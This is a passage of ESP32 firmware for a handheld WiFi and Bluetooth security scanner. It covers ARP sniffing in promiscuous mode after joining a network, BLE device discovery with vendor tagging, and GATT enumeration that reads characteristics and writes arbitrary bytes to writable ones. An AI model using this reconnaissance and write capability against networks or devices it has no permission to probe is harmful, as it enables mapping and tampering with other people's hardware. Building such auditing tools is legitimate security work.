        if (memcmp(g_arpEntries[j].mac, senderMac, 6) == 0) {
          memcpy(g_arpEntries[j].ip, senderIp, 4);
          g_arpEntries[j].lastSeen = millis();
          g_arpEntries[j].count++;
          return;
        }
      }

      if (g_arpCount < MAX_ARP_ENTRIES) {
        memcpy(g_arpEntries[g_arpCount].mac, senderMac, 6);
        memcpy(g_arpEntries[g_arpCount].ip,  senderIp,  4);
        g_arpEntries[g_arpCount].firstSeen = millis();
        g_arpEntries[g_arpCount].lastSeen  = millis();
        g_arpEntries[g_arpCount].count     = 1;
        g_arpCount++;
        Serial.printf("ARP: %d.%d.%d.%d -> %02X:%02X:%02X:%02X:%02X:%02X\n",
          senderIp[0], senderIp[1], senderIp[2], senderIp[3],
          senderMac[0], senderMac[1], senderMac[2],
          senderMac[3], senderMac[4], senderMac[5]);
      }
      return;
    }
  }
}

static void drawArpConfigScreen() {
  beginFrame(false);
  drawHeader("ARP Scanner");

  u8g2.setFont(u8g2_font_5x8_tf);
  u8g2.setCursor(UI_MARGIN_X, 30);
  u8g2.print("NETWORK");

  u8g2.setFont(BOLD_FONT);
  u8g2.setCursor(UI_MARGIN_X, 42);
  u8g2.print(ARP_AP_SSID);

  u8g2.setFont(u8g2_font_5x8_tf);
  u8g2.setCursor(UI_MARGIN_X, 58);
  u8g2.print("PASSWORD");

  u8g2.setFont(BOLD_FONT);
  u8g2.setCursor(UI_MARGIN_X, 70);
  u8g2.print(ARP_AP_PASS);

  u8g2.setFont(u8g2_font_5x8_tf);
  u8g2.setCursor(UI_MARGIN_X, 86);
  u8g2.print("OPEN IN BROWSER");

  gfx.drawRoundRect(UI_MARGIN_X, 90, 118, 14, 3, 1);
  u8g2.setFont(MAIN_FONT);
  u8g2.setCursor(UI_MARGIN_X + 8, 101);
  u8g2.print("192.168.5.1");

  drawFooter("hold=cancel");
  endFrame();
}

static void startArpScanner() {
  g_arpCount    = 0;
  g_arpActive   = false;
  g_arpChannel  = 0;
  g_lastArpHop  = 0;
  g_arpConnected = false;
  memset(g_arpEntries, 0, sizeof(g_arpEntries));

  // Show connecting screen
  beginFrame(false);
  drawHeader("ARP Scanner");
  u8g2.setFont(MAIN_FONT);
  u8g2.setCursor(UI_MARGIN_X, 45);
  u8g2.print("Connecting to:");
  u8g2.setFont(BOLD_FONT);
  u8g2.setCursor(UI_MARGIN_X, 60);
  u8g2.print(g_arpSSID);
  drawFooter("Please wait...");
  endFrame();

  // Connect to target network
  WiFi.mode(WIFI_STA);
  WiFi.begin(g_arpSSID, g_arpPass);

  uint32_t start = millis();
  while (WiFi.status() != WL_CONNECTED &&
         (uint32_t)(millis() - start) < 15000) {
    delay(200);
  }

  if (WiFi.status() != WL_CONNECTED) {
    // Failed to connect
    beginFrame(false);
    drawHeader("ARP Scanner");
    u8g2.setFont(MAIN_FONT);
    u8g2.setCursor(UI_MARGIN_X, 50);
    u8g2.print("Connection failed!");
    u8g2.setCursor(UI_MARGIN_X, 65);
    u8g2.print("Check credentials");
    drawFooter("hold=menu");
    endFrame();
    Serial.println("ARP: connection failed");
    return;
  }

  g_arpConnected = true;
  Serial.printf("ARP: connected to %s\n", g_arpSSID);
  Serial.printf("ARP: IP = %s\n", WiFi.localIP().toString().c_str());

  // Now set promiscuous mode to sniff ARP
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&arpCallback);

  g_arpActive = true;
  Serial.println("ARP scanner started");
  drawArpScreen();
}

static void stopArpScanner() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  delay(100);
  esp_wifi_stop();
  g_arpActive    = false;
  g_arpConnected = false;
  saveArpSession();
  Serial.printf("ARP scanner stopped. %d entries found.\n", g_arpCount);
}

static void saveArpSession() {
  if (g_arpCount == 0) return;
  if (!g_arpSessionIndexLoaded) loadArpSessionIndex();

  uint16_t slot = g_arpSessionNext % MAX_ARP_SESSIONS;
  char path[32];
  snprintf(path, sizeof(path), "/arp/a%03d.csv", slot);

  File f = FS.open(path, "w");
  if (!f) return;

  f.print("IP,MAC,FIRST_SEEN,LAST_SEEN,COUNT,NETWORK\r\n");
  for (int i = 0; i < g_arpCount; i++) {
    const ArpEntry& e = g_arpEntries[i];
    char bf[18];
    bssidFull(e.mac, bf, sizeof(bf));
    f.print(e.ip[0]); f.print("."); f.print(e.ip[1]);
    f.print("."); f.print(e.ip[2]); f.print("."); f.print(e.ip[3]);
    f.print(","); f.print(bf);
    f.print(","); f.print(e.firstSeen / 1000);
    f.print(","); f.print(e.lastSeen / 1000);
    f.print(","); f.print(e.count);
    f.print(","); fileCsvEscaped(f, g_arpSSID);
    f.print("\r\n");
  }
  f.close();

  if (g_arpSessionTotal < MAX_ARP_SESSIONS) g_arpSessionTotal++;
  g_arpSessionNext = (slot + 1) % MAX_ARP_SESSIONS;
  saveArpSessionIndex();
  Serial.printf("ARP session saved: %d entries\n", g_arpCount);
}

static void drawArpScreen() {
  beginFrame(false);
  drawHeader("ARP Scanner");

  u8g2.setFont(u8g2_font_5x8_tf);

  if (g_arpCount == 0) {
    u8g2.setFont(MAIN_FONT);
    u8g2.setCursor(UI_MARGIN_X, 42);
    u8g2.print("Listening for ARP...");
    drawFooter("hold=menu");
    endFrame();
    return;
  }

  const int ROWS  = 8;
  const int ROW_H = 11;
  const int TOP   = 28;

  int shown = 0;
  for (int i = g_arpCount - 1; i >= 0 && shown < ROWS; i--) {
    const ArpEntry& e = g_arpEntries[i];
    int y = TOP + (shown * ROW_H);
    shown++;

    char line[40];
    snprintf(line, sizeof(line), "%d.%d.%d.%d",
      e.ip[0], e.ip[1], e.ip[2], e.ip[3]);

    char bs[6];
    bssidShort(e.mac, bs, sizeof(bs));

    char full[48];
    snprintf(full, sizeof(full), "%s  %s", line, bs);

    u8g2.setCursor(UI_MARGIN_X, y);
    u8g2.print(full);
  }

  char footer[48];
  snprintf(footer, sizeof(footer), "%d devices  ch%d  hold=menu", g_arpCount, g_arpChannel);
  drawFooter(footer);
  endFrame();
}

// ============================================================================
//  BLE scanner start / stop / draw
// ============================================================================
static void startBleScanner() {
  g_bleCount       = 0;
  g_bleSelectedIdx = -1;
  g_blePrevSelected = -1;
  g_bleConnected   = false;
  g_bleCharCount   = 0;
  g_bleScrollOffset = 0;
  memset(g_bleDevices, 0, sizeof(g_bleDevices));

  // Show starting screen
  beginFrame(false);
  drawHeader("BLE Scanner");
  u8g2.setFont(MAIN_FONT);
  u8g2.setCursor(UI_MARGIN_X, 45);
  u8g2.print("Starting BLE scan...");
  drawFooter("Please wait...");
  endFrame();

  BLEDevice::init("");
  g_bleScan = BLEDevice::getScan();
  g_bleScan->setAdvertisedDeviceCallbacks(&g_bleCallback);
  g_bleScan->setActiveScan(true);   // active scan = request scan response
  g_bleScan->setInterval(100);
  g_bleScan->setWindow(99);

  g_bleActive = true;
  g_bleScan->start(0, nullptr, false); // 0 = scan forever
  Serial.println("BLE scanner started");
  drawBleScreen();
}

static void stopBleScanner() {
  g_bleActive = false;
  if (g_bleScan) {
    g_bleScan->stop();
    g_bleScan->clearResults();
  }
  BLEDevice::deinit(true);
  delay(100);
  saveBleSession();
  Serial.printf("BLE scanner stopped. %d devices found.\n", g_bleCount);
}

static void drawBleScreen() {
  beginFrame(false);
  drawHeader("BLE Scanner");

  u8g2.setFont(u8g2_font_5x8_tf);

  if (g_bleCount == 0) {
    u8g2.setFont(MAIN_FONT);
    u8g2.setCursor(UI_MARGIN_X, 42);
    u8g2.print("Scanning for BLE...");
    drawFooter("hold=menu");
    endFrame();
    return;
  }

  const int ROWS  = 8;
  const int ROW_H = 11;
  const int TOP   = 28;

  int shown = 0;
  for (int i = g_bleScrollOffset; i < g_bleCount && shown < ROWS; i++) {
    const BleDevice& d = g_bleDevices[i];
    int y = TOP + (shown * ROW_H);
    shown++;

    const char* tag = "   ";
    if (d.isApple)          tag = "APL";
    else if (d.isSamsung)   tag = "SAM";
    else if (d.isFitness)   tag = "FIT";
    else if (d.isIoT)       tag = "IOT";
    else if (d.connectable) tag = "CON";

    char bs[6];
    bssidShort(d.mac, bs, sizeof(bs));

    char line[40];
    snprintf(line, sizeof(line), "%s%s %s %s %ddBm",
      (i == g_bleSelectedIdx) ? ">" : " ",
      tag,
      bs,
      d.name[0] ? d.name : "?",
      d.rssi);
    line[38] = '\0';

    u8g2.setCursor(UI_MARGIN_X, y);
    u8g2.print(line);
  }

  int iotCount = 0;
  int conCount = 0;
  for (int i = 0; i < g_bleCount; i++) {
    if (g_bleDevices[i].isIoT)       iotCount++;
    if (g_bleDevices[i].connectable) conCount++;
  }

  char footer[48];
  snprintf(footer, sizeof(footer), "%d dev  %d IoT  %d conn  1x=sel 3x=detail",
    g_bleCount, iotCount, conCount);
  drawFooter(footer);
  endFrame();
}

// ============================================================================
//  BLE session storage
// ============================================================================
static void loadBleSessionIndex() {
  File f = FS.open("/ble/index.bin", "r");
  if (!f) {
    g_bleScanNext  = 0;
    g_bleScanTotal = 0;
    g_bleIndexLoaded = true;
    return;
  }
  const size_t expected = sizeof(g_bleScanNext) + sizeof(g_bleScanTotal);
  if (f.size() != expected) {
    f.close();
    g_bleScanNext = 0;
    g_bleScanTotal = 0;
    g_bleIndexLoaded = true;
    return;
  }
  if (f.read((uint8_t*)&g_bleScanNext, sizeof(g_bleScanNext)) != sizeof(g_bleScanNext) ||
      f.read((uint8_t*)&g_bleScanTotal, sizeof(g_bleScanTotal)) != sizeof(g_bleScanTotal)) {
    g_bleScanNext = 0;
    g_bleScanTotal = 0;
  }
  f.close();
  g_bleIndexLoaded = true;
}

static void saveBleSessionIndex() {
  File f = FS.open("/ble/index.bin", "w");
  if (!f) return;
  f.write((const uint8_t*)&g_bleScanNext,  sizeof(g_bleScanNext));
  f.write((const uint8_t*)&g_bleScanTotal, sizeof(g_bleScanTotal));
  f.close();
}

static void saveBleSession() {
  if (g_bleCount == 0) return;
  if (!g_bleIndexLoaded) loadBleSessionIndex();

  uint16_t slot = g_bleScanNext % MAX_BLE_SESSIONS;
  char path[32];
  snprintf(path, sizeof(path), "/ble/b%03d.csv", slot);

  File f = FS.open(path, "w");
  if (!f) return;

  f.print("MAC,NAME,RSSI,VENDOR,TYPE,CONNECTABLE,SERVICES,FIRST_SEEN,LAST_SEEN,COUNT\r\n");
  for (int i = 0; i < g_bleCount; i++) {
    const BleDevice& d = g_bleDevices[i];
    char bf[18];
    bssidFull(d.mac, bf, sizeof(bf));

    const char* type = "Generic";
    if (d.isApple)        type = "Apple";
    else if (d.isSamsung) type = "Samsung";
    else if (d.isFitness) type = "Fitness";
    else if (d.isIoT)     type = "IoT";

    f.print(bf);
    f.print(","); fileCsvEscaped(f, d.name[0] ? d.name : "(unnamed)");
    f.print(","); f.print(d.rssi);
    f.print(","); f.print(bleVendorName(d.manufacturer));
    f.print(","); f.print(type);
    f.print(","); f.print(d.connectable ? "yes" : "no");
    f.print(","); f.print(d.serviceCount);
    f.print(","); f.print(d.firstSeen / 1000);
    f.print(","); f.print(d.lastSeen / 1000);
    f.print(","); f.print(d.count);
    f.print("\r\n");
  }
  f.close();

  if (g_bleScanTotal < MAX_BLE_SESSIONS) g_bleScanTotal++;
  g_bleScanNext = (slot + 1) % MAX_BLE_SESSIONS;
  saveBleSessionIndex();
  Serial.printf("BLE session saved: %d devices\n", g_bleCount);
}

// ============================================================================
//  BLE GATT inspection - connect, enumerate, read, write
// ============================================================================
static void drawBleDetail() {
  beginFrame(false);
  drawHeader("BLE Device");

  u8g2.setFont(u8g2_font_5x8_tf);

  if (g_bleSelectedIdx < 0 || g_bleSelectedIdx >= g_bleCount) {
    u8g2.setCursor(UI_MARGIN_X, 50);
    u8g2.print("No device selected");
    drawFooter("hold=back");
    endFrame();
    return;
  }

  const BleDevice& d = g_bleDevices[g_bleSelectedIdx];

  const int X  = UI_MARGIN_X;
  const int Y  = 28;
  const int DY = 11;

  char bf[18];
  bssidFull(d.mac, bf, sizeof(bf));

  u8g2.setCursor(X, Y);
  u8g2.print("MAC:  "); u8g2.print(bf);

  u8g2.setCursor(X, Y + DY);
  u8g2.print("Name: ");
  u8g2.print(d.name[0] ? d.name : "(unnamed)");

  u8g2.setCursor(X, Y + DY * 2);
  u8g2.print("Vendor: ");
  u8g2.print(bleVendorName(d.manufacturer));

  u8g2.setCursor(X, Y + DY * 3);
  char rssiLine[32];
  snprintf(rssiLine, sizeof(rssiLine), "RSSI: %d dBm", d.rssi);
  u8g2.print(rssiLine);

  u8g2.setCursor(X, Y + DY * 4);
  char charLine[32];
  snprintf(charLine, sizeof(charLine), "Services: %d  Chars: %d",
    d.serviceCount, g_bleCharCount);
  u8g2.print(charLine);

  if (g_bleConnected) {
    u8g2.setCursor(X, Y + DY * 5);
    u8g2.print("Status: CONNECTED");
    drawFooter("2x=inspect  3x=inspect  hold=back");
  } else {
    u8g2.setCursor(X, Y + DY * 5);
    u8g2.print("Status: not connected");
    drawFooter("2x=connect  hold=back");
  }

  endFrame();
}

static void drawBleExploit() {
  beginFrame(false);
  drawHeader("BLE GATT");

  u8g2.setFont(u8g2_font_5x8_tf);

  if (g_bleCharCount == 0) {
    u8g2.setCursor(UI_MARGIN_X, 42);
    u8g2.print("No characteristics found");
    drawFooter("hold=back");
    endFrame();
    return;
  }

  const int ROWS  = 7;
  const int ROW_H = 11;
  const int TOP   = 28;

  int shown = 0;
  for (int i = 0; i < g_bleCharCount && shown < ROWS; i++) {
    const BleCharInfo& c = g_bleChars[i];
    int y = TOP + (shown * ROW_H);
    shown++;

    char flags[8] = "";
    if (c.canRead)   strcat(flags, "R");
    if (c.canWrite)  strcat(flags, "W");
    if (c.canNotify) strcat(flags, "N");

    char line[40];
    // Show last 8 chars of UUID to fit screen
    const char* shortUuid = c.uuid + (strlen(c.uuid) > 8 ? strlen(c.uuid) - 8 : 0);
    snprintf(line, sizeof(line), "...%s [%s]", shortUuid, flags);

    u8g2.setCursor(UI_MARGIN_X, y);
    u8g2.print(line);

    // Show value if read
    if (c.valueLen > 0) {
      char val[16] = "";
      for (int j = 0; j < min((int)c.valueLen, 4); j++) {
        char hex[4];
        snprintf(hex, sizeof(hex), "%02X ", c.value[j]);
        strcat(val, hex);
      }
      u8g2.setCursor(SCREEN_W / 2, y);
      u8g2.print(val);
    }
  }

  drawFooter("hold=back");
  endFrame();
}

static bool connectBleDevice(int idx) {
  if (idx < 0 || idx >= g_bleCount) return false;

  BleDevice& d = g_bleDevices[idx];

  // Show connecting screen
  beginFrame(false);
  drawHeader("BLE Connect");
  u8g2.setFont(MAIN_FONT);
  u8g2.setCursor(UI_MARGIN_X, 42);
  u8g2.print("Connecting to:");
  u8g2.setCursor(UI_MARGIN_X, 56);
  u8g2.print(d.name[0] ? d.name : "(unnamed)");
  drawFooter("Please wait...");
  endFrame();

  // Stop scanning while connecting
  if (g_bleScan) g_bleScan->stop();

  g_bleClient = BLEDevice::createClient();
  if (!g_bleClient) {
    Serial.println("BLE: failed to create client");
    return false;
  }

  // Build address string from MAC
  char addrStr[18];
  snprintf(addrStr, sizeof(addrStr),
    "%02x:%02x:%02x:%02x:%02x:%02x",
    d.mac[5], d.mac[4], d.mac[3],
    d.mac[2], d.mac[1], d.mac[0]);

  BLEAddress bleAddr(addrStr);

  if (!g_bleClient->connect(bleAddr)) {
    Serial.println("BLE: connection failed");
    delete g_bleClient;
    g_bleClient = nullptr;
    return false;
  }

  Serial.println("BLE: connected");
  g_bleConnected = true;
  g_bleCharCount = 0;

  // Enumerate services and characteristics
  std::map<std::string, BLERemoteService*>* services =
    g_bleClient->getServices();

  if (services) {
    for (auto& svc : *services) {
      Serial.printf("BLE Service: %s\n", svc.first.c_str());

      std::map<std::string, BLERemoteCharacteristic*>* chars =
        svc.second->getCharacteristics();

      if (chars) {
        for (auto& ch : *chars) {
          if (g_bleCharCount >= 20) break;

          BleCharInfo& info = g_bleChars[g_bleCharCount];
          memset(&info, 0, sizeof(info));

          strncpy(info.uuid, ch.first.c_str(), 36);
          info.uuid[36] = '\0';

          info.canRead   = ch.second->canRead();
          info.canWrite  = ch.second->canWrite();
          info.canNotify = ch.second->canNotify();

          // Try to read value
          if (info.canRead) {
            String val = ch.second->readValue();
            info.valueLen = min((int)val.length(), 32);
            memcpy(info.value, val.c_str(), info.valueLen);
            Serial.printf("  Char: %s = ", info.uuid);
            for (int i = 0; i < info.valueLen; i++) {
              Serial.printf("%02X ", info.value[i]);
            }
            Serial.println();
          }

          g_bleCharCount++;
        }
      }
    }
  }

  Serial.printf("BLE: enumerated %d characteristics\n", g_bleCharCount);
  return true;
}

static void disconnectBleDevice() {
  if (g_bleClient) {
    g_bleClient->disconnect();
    delete g_bleClient;
    g_bleClient = nullptr;
  }
  g_bleConnected = false;
  g_bleCharCount = 0;

  // Restart scan
  if (g_bleScan && g_bleActive) {
    g_bleScan->start(0, nullptr, false);
  }
}

static void tryBleWrite(int charIdx, const uint8_t* data, size_t len) {
  if (!g_bleConnected || !g_bleClient) return;
  if (charIdx < 0 || charIdx >= g_bleCharCount) return;
  if (!g_bleChars[charIdx].canWrite) return;

  // Get the characteristic
  std::map<std::string, BLERemoteService*>* services =
    g_bleClient->getServices();

  if (!services) return;

  int idx = 0;
  for (auto& svc : *services) {
    std::map<std::string, BLERemoteCharacteristic*>* chars =
      svc.second->getCharacteristics();
    if (!chars) continue;
    for (auto& ch : *chars) {
      if (idx == charIdx) {
        ch.second->writeValue((uint8_t*)data, len, true);
        Serial.printf("BLE: wrote %d bytes to %s\n", len, g_bleChars[charIdx].uuid);
        return;
      }
      idx++;
    }
  }
}

static void updateBleCursor() {
  display.fastmodeOn();

  const int ROWS  = 8;
  const int ROW_H = 11;
  const int TOP   = 28;

  // Erase and redraw previous row without cursor
  if (g_blePrevSelected >= 0 && g_blePrevSelected < g_bleCount) {
    int prevRow = g_blePrevSelected - g_bleScrollOffset;
    if (prevRow >= 0 && prevRow < ROWS) {
      int y = TOP + prevRow * ROW_H;
      gfx.fillRect(UI_MARGIN_X, y - 8, SCREEN_W - (UI_MARGIN_X * 2), ROW_H, 0);
      const BleDevice& d = g_bleDevices[g_blePrevSelected];

      const char* tag = "   ";
      if (d.isApple)          tag = "APL";
      else if (d.isSamsung)   tag = "SAM";
      else if (d.isFitness)   tag = "FIT";
      else if (d.isIoT)       tag = "IOT";
      else if (d.connectable) tag = "CON";

      char bs[6];
      bssidShort(d.mac, bs, sizeof(bs));
      char line[40];
      snprintf(line, sizeof(line), "%s %s %s %ddBm",
        tag, bs, d.name[0] ? d.name : "?", d.rssi);
      line[38] = '\0';
      u8g2.setFont(u8g2_font_5x8_tf);
      u8g2.setCursor(UI_MARGIN_X, y);
      u8g2.print(line);       // no prefix
    }
  }

  // Erase and redraw current row with cursor
  if (g_bleSelectedIdx >= 0 && g_bleSelectedIdx < g_bleCount) {
    int curRow = g_bleSelectedIdx - g_bleScrollOffset;
    if (curRow >= 0 && curRow < ROWS) {
      int y = TOP + curRow * ROW_H;
      gfx.fillRect(UI_MARGIN_X, y - 8, SCREEN_W - (UI_MARGIN_X * 2), ROW_H, 0);
      const BleDevice& d = g_bleDevices[g_bleSelectedIdx];

      const char* tag = "   ";
      if (d.isApple)          tag = "APL";
      else if (d.isSamsung)   tag = "SAM";
      else if (d.isFitness)   tag = "FIT";
      else if (d.isIoT)       tag = "IOT";
      else if (d.connectable) tag = "CON";

      char bs[6];
      bssidShort(d.mac, bs, sizeof(bs));
      char line[40];
      snprintf(line, sizeof(line), "%s %s %s %ddBm",
        tag, bs, d.name[0] ? d.name : "?", d.rssi);
      line[38] = '\0';
      u8g2.setFont(u8g2_font_5x8_tf);
      u8g2.setCursor(UI_MARGIN_X, y);
      u8g2.print("> ");       // prefix as separate print
      u8g2.print(line);       // text shifted right
    }
  }

  g_blePrevSelected = g_bleSelectedIdx;
  display.update();
}

// ============================================================================
//  Scanning screen - shown during manual scans
// ============================================================================
static void drawScanning() {
  beginFrame(false);
  drawHeader("WiFi Scanner");
  u8g2.setFont(MAIN_FONT);
  u8g2.setCursor(UI_MARGIN_X, 50);
  u8g2.print("Scanning nearby networks...");
  drawFooter("Please wait...");
  endFrame();
}

// ============================================================================
//  Web report screen - shown while AP is active
// ============================================================================
static void drawWebReportScreen() {

  beginFrame(false);

  drawHeader("Web Report");

  u8g2.setFont(u8g2_font_5x8_tf);
  u8g2.setCursor(UI_MARGIN_X, 30);
  u8g2.print("NETWORK");

  u8g2.setFont(BOLD_FONT);
  u8g2.setCursor(UI_MARGIN_X, 42);
  u8g2.print(AP_SSID);

  u8g2.setFont(u8g2_font_5x8_tf);
  u8g2.setCursor(UI_MARGIN_X, 58);
  u8g2.print("PASSWORD");

  u8g2.setFont(BOLD_FONT);
  u8g2.setCursor(UI_MARGIN_X, 70);
  u8g2.print(AP_PASS);

  u8g2.setFont(u8g2_font_5x8_tf);
  u8g2.setCursor(UI_MARGIN_X, 86);
  u8g2.print("OPEN IN BROWSER");

  gfx.drawRoundRect(UI_MARGIN_X, 90, 118, 14, 3, 1);

  u8g2.setFont(MAIN_FONT);
  u8g2.setCursor(UI_MARGIN_X + 8, 101);
  u8g2.print("192.168.4.1");

  drawFooter("hold=menu");

  endFrame();
}

// ============================================================================
//  Sleep screen - shown before entering deep sleep
// ============================================================================
static void drawSleepScreen() {
  beginFrame(false);

  const int boxX = 28, boxY = 28;
  const int boxW = SCREEN_W - 56, boxH = 60;

  gfx.drawRoundRect(boxX, boxY, boxW, boxH, 6, 1);

  u8g2.setFont(BOLD_FONT);
  const char* title = "WiFi Security Scanner";
  int tw = u8g2.getUTF8Width(title);
  u8g2.setCursor((SCREEN_W - tw) / 2, boxY + 22);
  u8g2.print(title);

  gfx.drawFastHLine(boxX + 18, boxY + 30, boxW - 36, 1);

  u8g2.setFont(MAIN_FONT);
  const char* subtitle = "Press button to wake";
  int sw = u8g2.getUTF8Width(subtitle);
  u8g2.setCursor((SCREEN_W - sw) / 2, boxY + 48);
  u8g2.print(subtitle);

  u8g2.setFont(u8g2_font_5x8_tf);
  const char* footer = "deep sleep enabled";
  int fw = u8g2.getUTF8Width(footer);
  u8g2.setCursor((SCREEN_W - fw) / 2, SCREEN_H - 10);
  u8g2.print(footer);

  endFrame();
}

// ============================================================================
//  Deep sleep
//  Shuts down WiFi and Bluetooth before sleeping.
//  Wakes on falling edge on BTN
// ============================================================================
static void goToSleep() {
  if (!ENABLE_DEEP_SLEEP) return;
  drawSleepScreen();
  delay(600);
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  delay(100);
  esp_wifi_stop();
  btStop();
  esp_bt_controller_disable();
  esp_sleep_disable_wakeup_source(ESP_SLEEP_WAKEUP_ALL);
  esp_sleep_enable_ext1_wakeup(1ULL << BTN, ESP_EXT1_WAKEUP_ALL_LOW);
  delay(50);
  esp_deep_sleep_start();
}

// ============================================================================
//  Web report server
//
//  Starts a WiFi AP and serves an HTML report at http://192.168.4.1
//  The table shows all networks from the historical g_seen[] database,
//  not just the current scan window, so accumulated data is preserved.
//  Uses F() macro to keep HTML strings in flash memory, not SRAM.
// ============================================================================
WebServer server(80);
WebServer arpServer(80);

static void handleArpConfig() {
  String html;
  html.reserve(1024);
  html  = F("<!DOCTYPE html><html><head>");
  html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
  html += F("<title>ARP Scanner Setup</title><style>");
  html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:24px;max-width:400px;margin:auto}");
  html += F("h1{color:#f3f4f6;font-size:22px;margin-bottom:4px}");
  html += F("p{color:#8b949e;font-size:13px;margin-bottom:24px}");
  html += F("label{display:block;font-size:12px;color:#9da7b3;margin-bottom:6px;font-weight:600;text-transform:uppercase}");
  html += F("input{width:100%;padding:10px;background:#161b22;border:1px solid #21262d;border-radius:8px;color:#d6d9df;font-size:14px;box-sizing:border-box;margin-bottom:16px}");
  html += F("button{width:100%;padding:12px;background:#238636;border:none;border-radius:8px;color:white;font-size:14px;font-weight:600;cursor:pointer}");
  html += F("button:hover{background:#2ea043}");
  html += F("</style></head><body>");
  html += F("<h1>ARP Scanner</h1>");
  html += F("<p>Enter the WiFi network credentials to scan for devices.</p>");
  html += F("<form method='POST' action='/arpconnect'>");
  html += F("<label>Network SSID</label>");
  html += F("<input type='text' name='ssid' placeholder='Network name' required>");
  html += F("<label>Password</label>");
  html += F("<input type='password' name='pass' placeholder='Password'>");
  html += F("<button type='submit'>Connect & Scan</button>");
  html += F("</form>");
  html += F("</body></html>");
  arpServer.send(200, "text/html", html);
}

static void handleArpConnect() {
  if (arpServer.hasArg("ssid")) {
    strncpy(g_arpSSID, arpServer.arg("ssid").c_str(), 32);
    g_arpSSID[32] = '\0';
  }
  if (arpServer.hasArg("pass")) {
    strncpy(g_arpPass, arpServer.arg("pass").c_str(), 63);
    g_arpPass[63] = '\0';
  }

  arpServer.send(200, "text/html",
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'></head>"
    "<body style='font-family:Inter,sans-serif;background:#0f1117;color:#d6d9df;padding:24px;text-align:center'>"
    "<h2 style='color:#f3f4f6'>Connecting...</h2>"
    "<p>The device is connecting to the network. The config AP will close.</p>"
    "</body></html>");

  delay(500);
  g_arpConfigMode = false;
  arpServer.stop();
  WiFi.softAPdisconnect(true);
  mode = MODE_ARP;
}

static void startArpConfig() {
  g_arpConfigMode = true;
  g_arpConnected  = false;
  memset(g_arpSSID, 0, sizeof(g_arpSSID));
  memset(g_arpPass, 0, sizeof(g_arpPass));

  WiFi.mode(WIFI_AP);

  // Set IP before starting AP
  IPAddress local_ip(192, 168, 5, 1);
  IPAddress gateway(192, 168, 5, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(local_ip, gateway, subnet);

  WiFi.softAP(ARP_AP_SSID, ARP_AP_PASS);
  delay(200);

  arpServer.on("/", handleArpConfig);
  arpServer.on("/arpconnect", HTTP_POST, handleArpConnect);
  arpServer.begin();

  mode = MODE_ARP_CONFIG;
  drawArpConfigScreen();
}

static void handleWebReport() {
  String html;
  html.reserve(3072);
  html  = F("<!DOCTYPE html><html><head>");
  html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
  html += F("<title>WiFi Security Report</title><style>");
  html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:16px;max-width:1100px;margin:auto;line-height:1.5}");
  html += F("h1{font-size:26px;margin-bottom:4px;color:#f3f4f6;letter-spacing:-0.5px}");
  html += F("h2{font-size:18px;margin-top:24px;margin-bottom:10px;color:#f3f4f6}");
  html += F("p.sub{color:#8b949e;font-size:12px;margin-top:0;margin-bottom:14px}");
  html += F(".tbl-wrap{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}");
  html += F("table{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #21262d;border-radius:12px;overflow:hidden;margin-top:12px}");
  html += F(".fixed{table-layout:fixed}");
  html += F("th{background:#1c2128;color:#9da7b3;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:0.03em;padding:6px 5px;text-align:left;white-space:nowrap;border-bottom:1px solid #2d333b}");
  html += F("td{padding:6px 5px;font-size:11px;border-bottom:1px solid #21262d}");
  html += F("td:first-child{max-width:100px;word-break:break-word}");
  html += F("tr:last-child td{border-bottom:none}");
  html += F("tr:nth-child(even){background:#141922}");
  html += F("tr:hover{background:#1b222c}");
  html += F(".badge{display:inline-block;padding:2px 6px;border-radius:999px;font-weight:600;font-size:10px;letter-spacing:0.02em;color:white;white-space:nowrap;box-shadow:inset 0 0 0 1px rgba(255,255,255,0.08)}");
  html += F(".mac{font-family:monospace;font-size:10px;white-space:nowrap}");
  html += F("a{color:#58a6ff;text-decoration:none;font-weight:500}");
  html += F("a:hover{text-decoration:underline}");
  html += F(".card{background:#161b22;border:1px solid #21262d;border-radius:14px;padding:16px;margin-top:20px;box-sizing:border-box}");
  html += F(".muted{color:#8b949e;font-size:11px}");
  html += F(".danger{color:#ff7b72;font-weight:600}");
  html += F(".footer{margin-top:18px;color:#6e7681;font-size:11px}");
  html += F("</style></head><body>");
  html += F("<h1>WiFi Security Report</h1>");

  if (!g_hasScanned) {
    html += F("<p>No scan data. Run a scan first.</p>");
  } else {
    char buf[64];
    snprintf(buf, sizeof(buf), "<p class='sub'>%d networks discovered</p>", g_seenCount);
    html += buf;

    html += F("<p class='footer'><a href='/export'>Download last scan CSV</a></p>");

    html += F("<div class='tbl-wrap'>");
    html += F("<table><tr><th>ESSID</th><th>BSSID</th><th>PWR</th><th>CH</th>");
    html += F("<th>MB</th><th>ENC</th><th>CIPHER</th><th>AUTH</th><th>RISK</th></tr>");

    for (int i = 0; i < g_seenCount; i++) {
      const ScanResult& r = g_seen[i];
      char bf[18], mb[8];
      bssidFull(r.bssid, bf, sizeof(bf));
      mbStr(r.maxRate, r.rateIsN, mb, sizeof(mb));

      html += F("<tr><td>");
      if (r.essid[0]) appendHtmlEscaped(html, r.essid);
      else html += F("<i>hidden</i>");
      html += F("</td><td class='mac'>"); html += bf;
      snprintf(buf, sizeof(buf), "</td><td>%d</td><td>%d</td><td>%s</td><td>",
               r.rssi, r.channel, mb);
      html += buf;
      html += encLabel(r.authMode);
      html += F("</td><td>"); html += cipherLabel(r.authMode);
      html += F("</td><td>"); html += authLabel(r.authMode);
      html += F("</td><td><span class='badge' style='background:");
      html += riskColor(r.riskLevel);
      html += F("'>"); html += riskWord(r.riskLevel);
      html += F("</span></td></tr>");
    }
    html += F("</table></div>");
